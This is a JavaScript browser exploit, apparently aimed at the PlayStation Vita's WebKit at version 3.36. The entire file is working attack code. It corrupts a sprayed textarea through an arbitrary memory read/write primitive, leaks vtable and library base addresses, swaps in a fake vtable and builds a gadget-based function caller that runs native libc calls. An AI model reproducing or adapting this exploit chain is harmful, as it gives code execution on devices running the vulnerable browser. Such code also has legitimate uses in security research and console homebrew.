textareas = new Array();

for (var i = 0; i < 0x2000; ++i) {
	var e = document.createElement("textarea");
	e.rows = 0x66656463;
	textareas.push(e);
}

var textarea_addr = 0;
for (var x = 0; x < 0x10000; ++x) {
	var addr = 0x85200000 / 4 + x;
	if (aspace32[addr] == 0x66656463) {
		logdbg("Changing textarea.rows at addr " + (addr * 4).toString(16));
		aspace32[addr] = 0x55555555;
		textarea_addr = addr * 4;
		break;
	}
}

var corrupted_textarea;
for (var i = 0; i < textareas.length; ++i)
	if (textareas[i].rows == 0x55555555) {
		corrupted_textarea = textareas[i];
		logdbg("Found corrupted textarea at " + i);
		break;
	}

try {

version = "v3_36";

defineLibraryFuncs();
defineOffsets();
offsets = ver_offsets[version];

var vtidx = textarea_addr + offsets.elementvtable_off;
var textareavptr = aspace32[vtidx / 4];
logdbg("Textarea vptr: 0x" + textareavptr.toString(16));

var setscrollleftptr = aspace32[textareavptr / 4 + offsets.setscrollleft_idx];
logdbg("WebCore::HTMLBodyElement::setScrollLeft is at 0x" + setscrollleftptr.toString(16));

var scewkbase = setscrollleftptr - offsets.scewkbase_off;

logdbg("SceWebkit base: 0x" + scewkbase.toString(16));

allocate_memory = init_memory(u32_base); // we should have 0x20040 bytes of memory we can freely use

var fkvtable = allocate_memory(0x100 * 4);
logdbg("Fake vtable at: 0x" + fkvtable.toString(16));

logdbg("Copying vtable...");
for (var i = 0; i < 0x100; i++) {
	aspace32[(fkvtable + (i << 2))/ 4] = aspace32[(textareavptr + (i << 2)) / 4];
}

aspace32[(vtidx) / 4] = fkvtable;

var scelibcbase = get_base_from_offsets(scewkbase, offsets.scelibcentry_off, offsets.scelibcbase_off);

logdbg("libc base: 0x" + scelibcbase.toString(16));


var bases = {
	"SceWebKit": scewkbase,
	"SceLibc": scelibcbase
};

var tmpmem = allocate_memory(0x5000);
caller = get_caller(tmpmem, corrupted_textarea, vtidx, fkvtable, version);
libraries = init_ggts(bases, caller, version);

logdbg("after caller init");

/* put code here */

var t = libraries.SceLibc.functions.time(0);
logdbg("time: " + t);

/* end code */

shell(aspace);

} catch (err) {
	alert(err.message);
}